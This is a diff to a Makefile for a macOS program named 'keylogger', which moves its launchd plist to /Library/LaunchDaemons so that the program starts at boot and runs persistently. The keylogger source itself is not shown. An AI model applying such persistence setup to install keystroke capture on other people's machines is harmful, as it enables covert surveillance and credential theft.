@@ -4,6 +4,8 @@ SOURCES=keylogger.c
 EXECUTABLE=keylogger
 PLIST=keylogger.plist
 INSTALLDIR=/usr/local/bin
+PLISTDIR=/Library/LaunchDaemons
+PLISTFULL=$(PLISTDIR)/$(PLIST)
 
 all: $(SOURCES)
 	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)
@@ -13,19 +15,19 @@ install:
 	cp $(EXECUTABLE) $(INSTALLDIR)
 
 uninstall:
-	launchctl -w unload $(LAPLIST)
+	launchctl unload $(PLISTFULL)
 	rm $(INSTALLDIR)/$(EXECUTABLE)
-	rm -f $(LAPLIST)
+	rm -f $(PLISTFULL)
 
-startup:
-	ln -s $(PLIST) $(LAPLIST)
-	launchctl load -w $(LAPLIST)
+startup: install
+	cp $(PLIST) $(PLISTFULL)
+	launchctl load -w $(PLISTFULL)
 
 load:
-	launchctl load $(LAPLIST)
+	launchctl load $(PLISTFULL)
 
 unload:
-	launchctl unload $(LAPLIST)
+	launchctl unload $(PLISTFULL)
 
 clean:
 	rm $(EXECUTABLE)
